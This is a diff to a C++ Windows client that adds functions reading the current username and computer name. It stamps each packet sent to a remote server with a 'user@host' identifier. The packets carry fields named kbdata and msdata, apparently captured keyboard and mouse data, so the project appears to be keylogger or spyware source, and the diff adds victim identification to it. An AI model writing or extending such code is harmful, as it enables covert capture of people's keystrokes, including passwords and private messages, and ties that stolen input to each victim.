@@ -3,6 +3,8 @@
 //
 
 #include <iostream>
+#include <windows.h>
+#include <Lmcons.h>
 #include "client/Command.hpp"
 
 Command::Command() {}
@@ -26,6 +28,28 @@ bool                        Command::process(std::map<char, Module> modules, std
     return true;
 }
 
+std::string                 Command::getUsername()
+{
+    TCHAR name [ UNLEN + 1 ];
+    DWORD size = UNLEN + 1;
+    std::string user;
+
+    GetUserName((TCHAR*)name, &size);
+    user = name;
+    return user;
+}
+
+std::string                 Command::getHostname()
+{
+    TCHAR  infoBuf[128];
+    DWORD  bufCharCount = 128;
+    std::string host;
+
+    GetComputerName(infoBuf, &bufCharCount);
+    host = infoBuf;
+    return host;
+}
+
 /*
  * Créer la structure à renvoyer au serveur.
  */
@@ -36,6 +60,9 @@ t_paquet                    *Command::getMessageFormat(Module module)
     data->kbdata = NULL;
     data->msdata = NULL;
     data->opcode = module.getOpcode();
+    data->id = this->getUsername();
+    data->id += "@";
+    data->id += this->getHostname();
     module.getDatas(data);
     if (data->kbdata == NULL && data->msdata == NULL)
         return NULL;
